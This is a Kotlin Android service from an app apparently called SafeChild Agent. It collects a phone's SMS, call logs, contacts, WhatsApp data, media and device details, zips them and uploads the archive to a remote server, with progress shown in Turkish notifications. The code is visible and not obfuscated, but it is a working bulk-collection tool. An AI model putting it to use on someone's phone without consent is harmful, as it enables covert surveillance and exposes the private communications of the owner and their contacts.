package com.safechild.agent.services

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.safechild.agent.R
import com.safechild.agent.SafeChildApp
import com.safechild.agent.utils.*
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class CollectionService : Service() {
    
    companion object {
        const val TAG = "CollectionService"
        const val EXTRA_TOKEN = "token"
        const val EXTRA_SERVER_URL = "server_url"
        
        const val ACTION_START = "com.safechild.agent.START_COLLECTION"
        const val ACTION_STOP = "com.safechild.agent.STOP_COLLECTION"
        
        const val NOTIFICATION_ID = 1001
    }
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var token: String = ""
    private var serverUrl: String = "https://safechild.mom/api"
    
    private lateinit var smsCollector: SmsCollector
    private lateinit var callLogCollector: CallLogCollector
    private lateinit var contactCollector: ContactCollector
    private lateinit var mediaCollector: MediaCollector
    private lateinit var whatsappCollector: WhatsAppCollector
    private lateinit var uploader: SecureUploader
    
    // Progress callback
    var onProgressUpdate: ((Int, String) -> Unit)? = null
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onCreate() {
        super.onCreate()
        
        smsCollector = SmsCollector(this)
        callLogCollector = CallLogCollector(this)
        contactCollector = ContactCollector(this)
        mediaCollector = MediaCollector(this)
        whatsappCollector = WhatsAppCollector(this)
        uploader = SecureUploader(this)
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                token = intent.getStringExtra(EXTRA_TOKEN) ?: ""
                serverUrl = intent.getStringExtra(EXTRA_SERVER_URL) ?: serverUrl
                
                if (token.isNotEmpty()) {
                    startForeground(NOTIFICATION_ID, createNotification("Veri toplama başlatılıyor..."))
                    startCollection()
                }
            }
            ACTION_STOP -> {
                stopCollection()
            }
        }
        return START_NOT_STICKY
    }
    
    private fun createNotification(message: String): Notification {
        return NotificationCompat.Builder(this, SafeChildApp.CHANNEL_ID)
            .setContentTitle("SafeChild Agent")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .setProgress(100, 0, true)
            .build()
    }
    
    private fun updateNotification(progress: Int, message: String) {
        val notification = NotificationCompat.Builder(this, SafeChildApp.CHANNEL_ID)
            .setContentTitle("SafeChild Agent")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .setProgress(100, progress, false)
            .build()
            
        val manager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
        manager.notify(NOTIFICATION_ID, notification)
        
        // Broadcast progress to UI
        Intent("com.safechild.agent.PROGRESS").also { progressIntent ->
            progressIntent.putExtra("progress", progress)
            progressIntent.putExtra("message", message)
            sendBroadcast(progressIntent)
        }
    }
    
    private fun startCollection() {
        serviceScope.launch {
            try {
                val collectedData = mutableMapOf<String, Any>()
                val tempDir = File(cacheDir, "collection_${System.currentTimeMillis()}")
                tempDir.mkdirs()
                
                // 1. SMS Collection (10%)
                updateNotification(5, "SMS mesajları toplanıyor...")
                val smsData = smsCollector.collect()
                collectedData["sms"] = smsData
                saveJsonToFile(tempDir, "sms.json", smsData)
                updateNotification(15, "SMS tamamlandı (${smsData.size} mesaj)")
                
                // 2. Call Logs (20%)
                updateNotification(20, "Arama kayıtları toplanıyor...")
                val callData = callLogCollector.collect()
                collectedData["calls"] = callData
                saveJsonToFile(tempDir, "call_log.json", callData)
                updateNotification(30, "Aramalar tamamlandı (${callData.size} kayıt)")
                
                // 3. Contacts (30%)
                updateNotification(35, "Rehber toplanıyor...")
                val contactData = contactCollector.collect()
                collectedData["contacts"] = contactData
                saveJsonToFile(tempDir, "contacts.json", contactData)
                updateNotification(45, "Rehber tamamlandı (${contactData.size} kişi)")
                
                // 4. WhatsApp (50%)
                updateNotification(50, "WhatsApp verileri toplanıyor...")
                val whatsappData = whatsappCollector.collect(tempDir)
                collectedData["whatsapp"] = whatsappData
                updateNotification(65, "WhatsApp tamamlandı")
                
                // 5. Media Files (70%)
                updateNotification(70, "Medya dosyaları toplanıyor...")
                val mediaData = mediaCollector.collect(tempDir)
                collectedData["media"] = mediaData
                updateNotification(85, "Medya tamamlandı (${mediaData.size} dosya)")
                
                // 6. Device Info & Metadata
                updateNotification(88, "Cihaz bilgileri ekleniyor...")
                val metadata = DeviceInfoCollector.collect(this@CollectionService)
                collectedData["device_info"] = metadata
                saveJsonToFile(tempDir, "metadata.json", metadata)
                
                // 7. Create ZIP
                updateNotification(90, "Veriler paketleniyor...")
                val zipFile = createZipFile(tempDir)
                
                // 8. Upload
                updateNotification(95, "Sunucuya gönderiliyor...")
                val uploadResult = uploader.upload(zipFile, token, serverUrl)
                
                if (uploadResult) {
                    updateNotification(100, "Tamamlandı!")
                    
                    // Broadcast success
                    Intent("com.safechild.agent.COMPLETE").also { completeIntent ->
                        completeIntent.putExtra("success", true)
                        sendBroadcast(completeIntent)
                    }
                } else {
                    throw Exception("Upload failed")
                }
                
                // Cleanup
                tempDir.deleteRecursively()
                zipFile.delete()
                
                // Stop service after completion
                delay(2000)
                stopSelf()
                
            } catch (e: Exception) {
                Log.e(TAG, "Collection failed", e)
                
                Intent("com.safechild.agent.COMPLETE").also { completeIntent ->
                    completeIntent.putExtra("success", false)
                    completeIntent.putExtra("error", e.message)
                    sendBroadcast(completeIntent)
                }
                
                stopSelf()
            }
        }
    }
    
    private fun saveJsonToFile(dir: File, filename: String, data: Any) {
        val file = File(dir, filename)
        val json = when (data) {
            is List<*> -> org.json.JSONArray(data).toString(2)
            is Map<*, *> -> JSONObject(data as Map<String, Any>).toString(2)
            else -> data.toString()
        }
        file.writeText(json)
    }
    
    private fun createZipFile(sourceDir: File): File {
        val zipFile = File(cacheDir, "collection_${token.take(8)}_${System.currentTimeMillis()}.zip")
        
        ZipOutputStream(zipFile.outputStream()).use { zos ->
            sourceDir.walkTopDown().forEach { file ->
                if (file.isFile) {
                    val entryName = file.relativeTo(sourceDir).path
                    zos.putNextEntry(ZipEntry(entryName))
                    file.inputStream().use { it.copyTo(zos) }
                    zos.closeEntry()
                }
            }
        }
        
        return zipFile
    }
    
    private fun stopCollection() {
        serviceScope.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
